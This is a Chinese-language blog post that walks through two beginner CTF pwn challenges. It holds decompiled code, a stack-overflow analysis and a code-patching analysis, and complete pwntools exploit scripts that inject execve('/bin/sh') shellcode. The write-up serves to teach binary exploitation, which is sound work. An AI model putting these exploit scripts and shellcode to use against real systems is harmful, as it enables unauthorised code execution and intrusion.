---
title: pwn_shellcode
date: 2019-09-24 23:03:45
tags: [pwn]
categories: [pwn]
copyright: true
description: <center>几道基础pwn shellcode问题</center>
photo: "http://r.photo.store.qq.com/psb?/V13BnVsC23MbK8/FmHGOBZ*7XP2d0.teLaIETv7qBeuAYHFW0jfCfdfZ50!/r/dLYAAAAAAAAA"
---
---

# Command Line

放入IDA分析伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-10h]

  printf("0x%lx\n", &v4, envp);
  __isoc99_scanf("%s", &v4);
  return 0;
}
```

可以知道该程序输出了v4的地址，然后我们使用checksec查看程序是否存在RWX段：

{% asset_img RWX.png %}

发现是存在RWX段的，然后在IDA中调试程序，使用`Ctrl+s`，查看printf打印出地址，发现地址所在栈是RWX的。因此很容易想到直接栈溢出然后劫持RIP，运行一段shellcode即可。因为v4距离RBP差16字节，所以返回地址（shellcode在栈中的地址）为程序打印出来的地址加上32（插入shellcode）字节的位置。exp如下：

```python
from pwn import *

io = process('./pwn1')

shellcode_addr = int(io.recv()[:-1],16)+0x20
shellcode = '\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

payload = '\x90'*24+p64(shellcode_addr)+shellcode

io.sendline(payload)

io.interactive()
```

# apprentice_www

首先checksec查看这个文件，发现没有RWX段。放入IDA，分析伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  alarm(0x1Eu);
  setup(main);
  return butterflySwag();
}
```

main函数里面很简单，调用了alarm函数反调试，同时调用了setup和butterflySwag函数。然后查看这两个函数

```c
//setup()
int __cdecl setup(int a1)
{
  int result; // eax
  signed int i; // [esp+18h] [ebp-10h]

  for ( i = 0; i <= 2; ++i )
    result = mprotect((void *)((i << 12) + (a1 & 0x8048000)), 0x1000u, 7);
  return result;
}
```

看到setup函数后，发现调用了mprotect函数，setup函数的作用就是将`0x8048000~0x804a000`段都改为RWX段。于是有一个模糊思路，就是栈溢出劫持eip然后在RWX段上执行shellcode。

```c
int butterflySwag()
{
  _BYTE *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  __isoc99_scanf((const char *)&unk_8048730, &v1);
  __isoc99_scanf((const char *)&unk_8048733, &v2);
  v2 = (unsigned __int8)v2;
  *v1 = v2;
  if ( v2 )
  {
    if ( v2 == 1 )
    {
      puts("All truly great thoughts are conceived by walking.");
    }
    else if ( v2 > 4 )
    {
      if ( v2 > 9 )
        puts("When you look into an abyss, the abyss also looks into you.");
      else
        puts("He who has a why to live can bear almost any how.");
    }
    else
    {
      puts("Without music, life would be a mistake.");
    }
  }
  else
  {
    puts("That which does not kill us makes us stronger.");
  }
  return 0;
}
```

可以看到v1所在地址被1字节的v2赋值，为了分析的更清晰，于是查看其汇编代码：

{% asset_img jnz.png %}

分析到`080485D2`处的时候，我们可以看到该处dl寄存器的值赋值给了eax所存储的地址处。其中edx的值是v2，eax的值是v1。那么我们想到，可以利用这段代码，将想要修改的地址修改成我们想要的东西。如果要输入一段shellcode，我们可以使用scanf来进行输入，所以我们注意到`080485D9`处的jnz指令，只要合理修改jnz的操作数，就可以直接跳到`0804859D`也就是第一个scanf前，然后输入shellcode。因为jnz的操作数是8位带符号数，所以我们计算出`080485D9-0804859D = ffc2`，所以只需要将jnz指令后的操作数改为c2就可以了。然后因为分析代码可知，我们将v1用来存储地址，v2用来存放将会在地址上赋值的内容。所以shellcode只能每次输入一个字节。所以需要不断跳到scanf直到输入完整的shellcode。然后再修改jnz指令，跑完程序。exp如下：

```python
#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

patch_jne_address = 0x080485da		#jnz loc_80485E9所在地址，修改jnz后的操作数
shellcode_address = 0x080485db		#shellcode放置的地址

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#xor eax, eax
#push eax
#push 68732F2Fh
#push 6E69622Fh
#mov ebx, esp
#push eax
#push ebx
#mov ecx, esp
#mov al, 0Bh
#int 80h

io.sendline(str(patch_jne_address))
io.sendline(str(0xc2))				#将jnz loc_80485E9改成jnz loc_804859D，重复执行两个call __isoc99_scanf读取shellcode

for i in xrange(len(shellcode)):			#逐字节写入shellcode到jnz loc_80485E9指令后面
	io.sendline(str(shellcode_address+i))
	io.sendline(str(ord(shellcode[i])))

io.sendline(str(patch_jne_address))
io.sendline(str(0x00))				#写完shellcode后改为jnz loc_80485DB，执行shellcode

io.recv()							#把垃圾数据读走

io.interactive()
```
